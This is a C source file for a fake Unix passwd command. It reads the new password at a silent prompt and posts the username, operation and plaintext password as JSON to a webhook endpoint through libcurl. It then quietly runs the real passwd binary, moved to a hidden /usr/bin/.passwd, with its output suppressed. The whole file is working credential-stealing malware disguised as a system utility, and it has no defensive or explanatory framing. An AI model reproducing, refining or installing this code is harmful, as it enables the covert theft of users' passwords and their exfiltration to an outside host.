#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <libgen.h>
#include <curl/curl.h>
#include <termios.h>
#include <sys/wait.h>

#define WEBHOOK_URL "YOUR_WEBHOOK_URL"

void send_webhook(const char *username, const char *operation, const char *password) {
    CURL *curl;
    CURLcode res;

    // Ensure username and operation are valid
    if (username == NULL || strlen(username) == 0) {
        username = "unknown_user";
    }
    if (operation == NULL || strlen(operation) == 0) {
        operation = "unknown_operation";
    }

    // Prepare webhook data with 'content'
    char payload[1024];
    snprintf(payload, sizeof(payload), "{\"content\": \"User: %s, Operation: %s, Password: %s\"}", 
             username, operation, password ? password : "null");

    // Log payload for debugging
    printf("Payload: %s\n", payload);  // Debug line to print the payload

    // Initialize CURL
    curl = curl_easy_init();
    if (curl) {
        // Set the URL for the webhook
        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL);

        // Set the POST fields
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);

        // Set headers to indicate JSON content type
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Perform the request
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            fprintf(stderr, "Webhook error: %s\n", curl_easy_strerror(res));
        }

        // Cleanup
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    } else {
        fprintf(stderr, "Failed to initialize CURL.\n");
    }
}

void capture_password(char *password, size_t size, const char *prompt) {
    struct termios oldt, newt;

    // Turn off terminal echo for password input
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    // Print prompt and read password
    printf("%s", prompt);
    fflush(stdout);
    if (fgets(password, size, stdin) == NULL) {
        perror("Error reading password");
        password[0] = '\0';
    }

    // Remove newline character if present
    size_t len = strlen(password);
    if (len > 0 && password[len - 1] == '\n') {
        password[len - 1] = '\0';
    }

    // Restore terminal echo
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    printf("\n");
}

int main(int argc, char *argv[]) {
    char *real_passwd_path = "/usr/bin/.passwd"; // Path to the original `passwd`
    char *operation = "unknown";
    char *username = NULL;
    char password[256] = {0};
    int intercept_password = 0;

    // Parse arguments to identify operation
    if (argc > 1) {
        for (int i = 1; i < argc; i++) {
            if (argv[i][0] != '-') {
                username = argv[i];
            } else if (strcmp(argv[i], "-l") == 0) {
                operation = "lock";
            } else if (strcmp(argv[i], "-u") == 0) {
                operation = "unlock";
            } else if (strcmp(argv[i], "-d") == 0) {
                operation = "delete";
            } else if (strcmp(argv[i], "-e") == 0) {
                operation = "expire";
            } else {
                operation = "change_password";
                intercept_password = 1;
            }
        }
    }

    // Default operation is password change
    if (argc == 1) {
        operation = "change_password";
        intercept_password = 1; // Enable password interception for interactive mode
    }

    // Default to the current user if no username is specified
    if (!username) {
        username = getlogin();
        if (!username) {
            perror("getlogin");
            exit(EXIT_FAILURE);
        }
    }

    // Log the operation
    printf("Operation: %s, User: %s\n", operation, username);

    // Intercept the password if applicable
    if (intercept_password) {
        capture_password(password, sizeof(password), "Enter new password: ");
        char confirm_password[256] = {0};
        capture_password(confirm_password, sizeof(confirm_password), "Retype new password: ");

        if (strcmp(password, confirm_password) != 0) {
            fprintf(stderr, "Passwords do not match.\n");
            exit(EXIT_FAILURE);
        }
    }

    // Send webhook with operation details
    send_webhook(username, operation, intercept_password ? password : NULL);

    // Forward arguments to the real `passwd` binary, suppressing its output
    pid_t pid = fork();
    if (pid == 0) {
        // Child process: Call .passwd
        freopen("/dev/null", "w", stdout); // Suppress stdout
        freopen("/dev/null", "w", stderr); // Suppress stderr
        execv(real_passwd_path, argv);

        // If execv fails
        perror("execv");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process: Wait for child to finish
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
            fprintf(stderr, "Error: .passwd exited with status %d\n", WEXITSTATUS(status));
        }
    } else {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    return 0;
}
